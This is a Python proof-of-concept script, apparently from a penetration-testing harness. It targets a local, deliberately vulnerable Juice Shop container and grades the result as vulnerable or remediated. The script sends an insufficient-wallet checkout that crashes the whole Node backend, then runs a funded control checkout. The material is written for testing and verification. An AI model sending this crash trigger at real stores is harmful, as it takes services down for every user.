#!/usr/bin/env python3
"""pt31: a checkout whose wallet balance is insufficient crashes the
entire backend process, not just that one request.

Discovered while building pt30: an empty-basket checkout with a
delivery fee against a $0 wallet took the shared flatline-juice-shop
container down twice during testing. Isolated and confirmed here
against flatline-juice-shop-unsafe instead, with a minimal, completely
ordinary trigger: one basket item, no delivery method, a $0 wallet,
paymentId "wallet". routes/order.ts's PDF-stream 'finish' callback and
its own "Insufficient wallet balance" error handler both try to send a
response with no coordination between them; whichever runs second
throws an uncaught ERR_HTTP_HEADERS_SENT that is not caught anywhere
and kills the whole Node process.

Not found anywhere in Juice Shop's own 109-item challenge catalog.

IMPORTANT: this item's pre-fix run crashes its target container by
design. Run it only against flatline-juice-shop-unsafe
(--target http://localhost:3012, the blueprint's default), and restart
that container (`docker start flatline-juice-shop-unsafe`) after any
VULNERABLE result before running anything else against it.

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt31-001.json"
PRODUCT_ID = 1


def _request(method: str, url: str, token: str | None = None, body: dict | None = None, timeout: float = 10):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}
    except Exception:
        return None, {}


def _jwt_user_id(token: str) -> int:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    payload = json.loads(base64.urlsafe_b64decode(padded))
    return payload["data"]["id"]


def _register_and_login(target: str, label: str, stamp: str) -> tuple[str, str, int]:
    email = f"pt31-{label}-{stamp}@flatline.test"
    password = "Pt31Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    bid = body["authentication"]["bid"]
    return token, str(bid), _jwt_user_id(token)


def _server_reachable(target: str) -> bool:
    status, _ = _request("GET", f"{target}/rest/products/search?q=juice", timeout=5)
    return status == 200


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    token, bid, user_id = _register_and_login(target, "attacker", stamp)
    add_status, _ = _request("POST", f"{target}/api/BasketItems", token=token, body={
        "ProductId": PRODUCT_ID, "BasketId": bid, "quantity": 1,
    })

    checkout_status, _ = _request("POST", f"{target}/rest/basket/{bid}/checkout", token=token, body={
        "UserId": user_id, "orderDetails": {"paymentId": "wallet", "addressId": 1},
    }, timeout=15)

    time.sleep(1)
    server_still_reachable = _server_reachable(target)

    if checkout_status == 500 and not server_still_reachable:
        status_result = "VULNERABLE"
        summary = "The insufficient-funds checkout returned HTTP 500 and the server became unreachable immediately after, a full-process crash from one ordinary checkout failure."
    elif checkout_status in (400, 402) and server_still_reachable:
        status_result = "REMEDIATED"
        summary = f"The checkout was rejected cleanly (HTTP {checkout_status}) before reaching the crash-prone backend path; the server stayed reachable."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: add_status={add_status}, checkout_status={checkout_status}, server_still_reachable={server_still_reachable}."

    legitimate_funded_checkout_ok = False
    if server_still_reachable:
        legitimate_funded_checkout_ok = _legitimate_funded_checkout(target, stamp)

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "add_status": add_status,
        "checkout_status": checkout_status,
        "server_still_reachable": server_still_reachable,
        "summary": summary,
        "legitimate_funded_checkout_ok": legitimate_funded_checkout_ok,
    }


def _legitimate_funded_checkout(target: str, stamp: str) -> bool:
    """A checkout whose wallet balance covers the order total: adds a
    card, tops up the wallet with enough funds via that card, then
    checks out with paymentId 'wallet'. Never crashes the backend,
    since the bug only triggers on an insufficient balance."""
    token, bid, user_id = _register_and_login(target, "legit", stamp)
    card_status, card_body = _request("POST", f"{target}/api/Cards", token=token, body={
        "fullName": "Flatline Tester", "cardNum": 1111222233334444, "expMonth": 1, "expYear": 2099,
    })
    if card_status != 201:
        return False
    card_id = card_body.get("data", {}).get("id")

    topup_status, _ = _request("PUT", f"{target}/rest/wallet/balance", token=token, body={"paymentId": card_id, "balance": 50})
    if topup_status != 200:
        return False

    add_status, _ = _request("POST", f"{target}/api/BasketItems", token=token, body={
        "ProductId": PRODUCT_ID, "BasketId": bid, "quantity": 1,
    })
    if add_status not in (200, 201):
        return False

    checkout_status, _ = _request("POST", f"{target}/rest/basket/{bid}/checkout", token=token, body={
        "UserId": user_id, "orderDetails": {"paymentId": "wallet", "addressId": 1},
    })
    return checkout_status == 200


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt31-wallet-checkout-crash", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
